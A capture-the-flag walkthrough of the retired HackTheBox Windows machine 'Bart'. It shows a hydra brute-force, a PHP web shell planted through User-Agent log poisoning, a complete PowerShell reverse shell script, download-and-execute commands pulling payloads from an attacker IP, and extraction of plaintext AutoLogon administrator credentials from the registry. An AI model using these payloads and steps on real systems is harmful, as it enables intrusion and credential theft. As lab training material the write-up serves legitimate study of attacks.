# HackTheBox — Bart

**Platform:** HackTheBox  
**Difficulty:** Hard  
**OS:** Windows  
**Category:** Web Exploitation / SSRF / Log Poisoning / AutoLogon Credential Extraction  
**Status:** Retired  

---

## Summary

Bart is a tricky Windows box involving vhost enumeration, user discovery via a hidden dev site, brute-forcing a custom login form, chaining SSRF with PHP log poisoning for RCE, and extracting AutoLogon registry credentials for privilege escalation.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/bart 10.10.10.81
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
```

Add to `/etc/hosts`:

```
10.10.10.81  bart.htb
```

### Main Site Enumeration

Visiting `http://bart.htb` shows a corporate landing page with team member names:

- **Samantha Brown**
- **Daniel Simmons**
- **Robert Hilton**
- One more is commented out in the HTML source: **Harvey Potter** — `h.potter`

Page source also reveals a link/reference to `http://forum.bart.htb`.

Add to `/etc/hosts`:

```
10.10.10.81  forum.bart.htb monitor.bart.htb internal.bart.htb
```

---

## Web Exploitation

### forum.bart.htb

A forum, but not much functionality exposed.

### monitor.bart.htb

A PHP Server Monitor installation. Try known usernames from the team names:

- `harvey` with common passwords → try `potter`
- `administrator`

**`harvey:potter` works.**

After login, there's a server being monitored: `internal.bart.htb`

### internal.bart.htb

Login page. No known credentials. Username enumeration via error messages:

- Username `harvey` → "Invalid password"
- Username `test` → "Invalid username"

**Valid username: harvey**

### Brute-Forcing internal.bart.htb

Custom login form — hydra with the correct parameters:

```bash
hydra -l harvey -P /usr/share/wordlists/rockyou.txt bart.htb http-post-form \
  "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password" \
  -s 80
```

Password: **potter**

---

## RCE via Log Poisoning

After login to `internal.bart.htb`, there's a simple chat application. It has a log functionality:

```
http://internal.bart.htb/simple_chat/login_log.php?filename=log.txt
```

The `filename` parameter writes to a log file. This is a **Log Poisoning** setup:

### Step 1 — Inject PHP into the Log

Set the User-Agent to a PHP payload:

```bash
curl -s "http://internal.bart.htb/simple_chat/login_log.php?filename=log.php" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

### Step 2 — Trigger Code Execution

```bash
curl -s "http://internal.bart.htb/log/log.php?cmd=whoami"
```

```
nt authority\iusr
```

**RCE confirmed!**

### Step 3 — Reverse Shell

Generate a PowerShell reverse shell and host it:

```bash
# rev.ps1
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.X", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

```bash
# Trigger download and exec
curl "http://internal.bart.htb/log/log.php?cmd=powershell+IEX(New-Object+Net.WebClient).downloadString('http://10.10.14.X/rev.ps1')"
```

Shell as `nt authority\iusr`.

---

## User Flag

```powershell
type C:\Users\Administrator\Desktop\user.txt
# (Access Denied — need to escalate first)

# Check other users
Get-ChildItem C:\Users\
# Administrator, DefaultAppPool, Harvey
type C:\Users\Harvey\Desktop\user.txt
```

---

## Privilege Escalation

### AutoLogon Registry Credentials

Windows stores AutoLogon passwords in the registry in plaintext:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```
DefaultUserName    REG_SZ    Administrator
DefaultPassword    REG_SZ    3130438f31186fbaf962f407711faddb
DefaultDomainName  REG_SZ    BART
```

### Use Credentials

```bash
# PSExec with found credentials
psexec.py BART/Administrator:'3130438f31186fbaf962f407711faddb'@10.10.10.81
```

Or use WinRM / RunAs:

```powershell
$password = ConvertTo-SecureString "3130438f31186fbaf962f407711faddb" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("Administrator", $password)
Start-Process powershell -Credential $cred -ArgumentList "-c IEX(New-Object Net.WebClient).downloadString('http://10.10.14.X/rev2.ps1')"
```

**Administrator shell obtained.**

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- **HTML source inspection** reveals hidden users and subdomains — always read the DOM
- Monitor applications often reuse the credentials they're given — try credentials across all discovered apps
- **Log poisoning** = write PHP into a log file, then request that log as a PHP file
- User-Agent injection is the cleanest vector for log poisoning (logged server-side automatically)
- **AutoLogon registry keys** store plaintext Administrator passwords — always check `Winlogon`
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` should be in every Windows privesc checklist

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| hydra | Login brute-force |
| curl | Log poisoning, RCE |
| PowerShell | Reverse shell, privesc |
| reg query | AutoLogon credential extraction |
| psexec.py | Authenticated remote execution |
